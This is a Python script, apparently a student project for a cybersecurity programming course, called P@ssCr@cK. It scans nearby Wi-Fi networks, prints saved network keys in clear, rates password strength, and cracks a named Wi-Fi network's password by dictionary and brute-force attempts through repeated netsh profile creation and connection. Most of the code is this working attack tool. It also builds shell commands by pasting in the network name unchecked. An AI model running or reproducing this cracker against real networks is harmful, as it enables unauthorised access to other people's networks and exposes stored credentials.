import os
import time
import requests
import subprocess
from itertools import product


black = '\033[30m'
red = '\033[31m'
green = '\033[32m'
orange = '\033[33m'
blue = '\033[34m'
purple = '\033[35m'
cyan = '\033[36m'
lightgrey = '\033[37m'
darkgrey = '\033[90m'
lightred = '\033[91m'
yellow = '\033[93m'
lightblue = '\033[94m'
reset = '\033[0m'
bold = '\033[01m'


def ScanningNets():
    try:
     network = subprocess.check_output(['netsh', 'wlan', 'show', 'networks'])
     networks = network.decode('ascii')

     print('')
     print(cyan+'--------------------------------------------------------')
     print('-------------------[Scanning Network...]----------------')
     print('----------|THE Nearest AVAILABLE NETWROKS|-------------')
     print('--------------------------------------------------------'+reset)
     print(bold+black+networks+reset)
    except:
        print(' THERE IS WPA3 NETWORK TRY AGAIN LATER !!')



def CheckPssStrength():
    charCount = 0
    StrCount = 0
    DigCount = 0
    haveChar = False
    haveDigit = False
    haveStr = False
    PassW = input(black+'>> Please Enter Your Password :'+reset)
    if len(PassW) < 8:
        print(lightred+"[Bad Start] Your password is less than 8 charcters >>> [ Your password Vary Weak!! ]"+reset)
    if len(PassW) > 8:
        for i in range(0,len(PassW)):
            if PassW[i].isalpha():
                StrCount += 1
                haveStr = True
            elif PassW[i].isdigit():
                DigCount += 1
                haveDigit = True
            else:
                charCount += 1
                haveChar = True

        if StrCount < 2:
            print(black+'>> You need To add more letters at least 2 '+reset)
        if DigCount < 2:
            print(black+'>> You need To add more Numbers at least 2 '+reset)
        if charCount == 0:
            print(black+'>> You need To add at least 1 Char '+reset)
        if (StrCount < 1 and charCount == 0 ) and (haveDigit):
            print(red+'>> The Strength Of Your Password is >> [ Weak ] Follow our advice  '+reset)
        if (charCount == 0 and DigCount < 1) and (haveStr):
            print(red+'>> The Strength Of Your Password is >> [ Weak ] Follow our advice  '+reset)
        if (charCount != 0 and DigCount > 1) and not (haveStr) :
            print(red + '>> The Strength Of Your Password is >> [ Weak ] Follow our advice  ' + reset)
        if (charCount != 0 and StrCount > 1) and not haveDigit:
            print(red + '>> The Strength Of Your Password is >> [ Weak ] Follow our advice  ' + reset)
        if (charCount != 0 and StrCount < 1) and not haveDigit:
            print(red + '>> The Strength Of Your Password is >> [ Weak ] Follow our advice  ' + reset)
        if (StrCount >= 2 and charCount == 0 and DigCount >= 2) and (haveStr and haveDigit):
            print(yellow+'>> The Strength Of Your Password is >> [ Moderate ] Follow our advice  '+reset)
        if (StrCount >= 2 and charCount != 0 and DigCount >= 2) and (haveStr and haveDigit and haveChar):
            print(green+'>> The Strength Of Your Password is >> [ VERY STRONG !! ] Our Tool Will Take while To crack This '+reset)

name =''
P=''
def PrintWiFiInfo(NAME,PASS):
    print(bold+black+"DO YOU WANT THE FULL INFORMATIONS ABOUT THE CONNECTED NETWORK? [Y/N] : " )
    answer=input(bold+black+'ENTER HERE :'+reset)
    if answer == 'Y':
        print(bold+black)
        os.system(f'netsh wlan show profile name="{NAME}" key=clear')
        print(reset)
    if answer == 'N':
       print(bold+green+"THE WI-FI YOU ARE CONNECTED TO : " + NAME)
       print("THE PASSWORD IS : " + PASS+reset)
def createFile(n,p):

 config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>"""+n+"""</name>
    <SSIDConfig>
        <SSID>
            <name>"""+n+"""</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>"""+p+"""</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
 file = open(name + ".xml", 'w')
 file.write(config)

def FindPassword(name):
 try:
  print(bold+black+'------- [ LETS CRACK THE PASSWORD ] ---------'+reset)

  print(bold+black+'FIRST ,DO YOU WANT TO START WITH FASTER WAY [NOTE: BUT LESS PROBABILITY] ?'+reset)
  print('')
  A=input('(Y OR N) : '+reset)
  if A =='Y':
   print(bold+cyan+'----------------[ LETS START THE DICTIONARY ATTACK ]------------------ '+reset)

   with open("/Users/hp/Desktop/pass.txt", "r") as f:

     for l in f:
          try:
            PASS = l.split()

            if PASS:
             P = PASS[0]
             createFile(name, PASS[0])
             time.sleep(1)
             print(bold+black+f"Trying >>> Password >>>: {PASS[0]}"+reset)
             command = "netsh wlan add profile filename=" + name + ".xml" + " interface=WiFi"
             os.system(command)
             time.sleep(1)
             os.system("netsh wlan connect name=" + name+ " interface=WiFi")
             time.sleep(1)
             request = requests.get("http://www.python.org", timeout=10)
             print(green+"[NOTE] connected successfully "+reset)
             PrintWiFiInfo(name,PASS[0])
             return #exit()

          except (requests.ConnectionError, requests.Timeout) as exception:
            os.remove(name + ".xml")
            print(red+"[LOADING] NOT CONNECTED TRY ANOTHER PASSWORD "+reset)
  if A == 'N':
    print(cyan+bold+'----------------[ LETS START THE BRUTE FORCE ATTACK ]------------------ '+reset)
    chars = '0123456789abcdefghijklmnopqrstuvwxyz'
    for length in range(8, 9):
         attempt = product(chars, repeat=length)

         for a in attempt:
              try:
                print(black+'TRYING >>> '+''.join(a)+reset)
                createFile(name, ''.join(a))
                command = "netsh wlan add profile filename=" + name + ".xml" + " interface=WiFi"
                os.system(command)
                os.system("netsh wlan connect name=" + name + " interface=WiFi")
                time.sleep(1)
                request = requests.get("http://www.python.org", timeout=10)
                print(green+"[NOTE] connected successfully "+reset)
                PrintWiFiInfo(name, ''.join(a))
                return

              except (requests.ConnectionError, requests.Timeout) as exception:
                os.remove(name + ".xml")
                print(red+"[LOADING] NOT CONNECTED TRY ANOTHER PASSWORD "+reset)
 except KeyboardInterrupt as e:
        print("\n >>>  ENDING the program  <<< ")
        exit()

lop=True
while lop:
 time.sleep(1)
 print(black+"------------------------------------------------------------------------------------------------------------------"+reset)
 print(cyan+'                               >>>>>>>>>>>> [ WELCOME TO P@ssCr@cK ]<<<<<<<<<<<<                                    '+reset)
 print(black+"------------------------------------------------------------------------------------------------------------------"+reset)
 print(cyan+">> This Tool Designed by :")
 print(">> Asma H.ALHarith      >> Muneera Alsulaiman   >> Ghada Bin Rubaian    >> Dalal K. Alkhaldi    >> Lujain Alqahtani")
 print(">> Course Instructer :  Dr.Reem al assaf  ")
 print(">> Course  :  Programming For CyberSecurity "+reset)
 print(black+"------------------------------------------------------------------------------------------------------------------"+reset)
 print("")
 print(cyan+"                                               >> START HERE <<                                                   "+reset)
 print("")
 print(black+">> WHAT DO YOU WANT TO PERFORM ? (ENTER THE NUMBER) ")
 print("")
 print(">> [1] Check The nearest available Networks  ")
 print(">> [2] Crack The Wi-Fi Password ")
 print(">> [3] Test The Strength  Of Your Wi-Fi Password  ")
 print(">> [4] Check The all the previous connected networks  ")
 print(">> [5] Exit :(  ")
 print("")
 task=input('ENTER HERE >> '+reset)

 if task == '1':
     ScanningNets()
 elif task == '2':
     name = input(cyan + "Enter The WIFI Name: ")
     FindPassword(name)
 elif task== '3':
     CheckPssStrength()

 elif task == '4':
    print(black)
    os.system('netsh wlan show profile')
    print(reset)
 elif task == '5':
     print(black+">> [EXITING THE Program ....Good Byeee ! ] <<  "+reset)
     lop=False
     exit()
 else:
     print(lightred+"[NOTE: WRONG INPUT] >>  PLEASE ENTER ONE OF THE NUMBERS IN THE LIST   "+reset)
























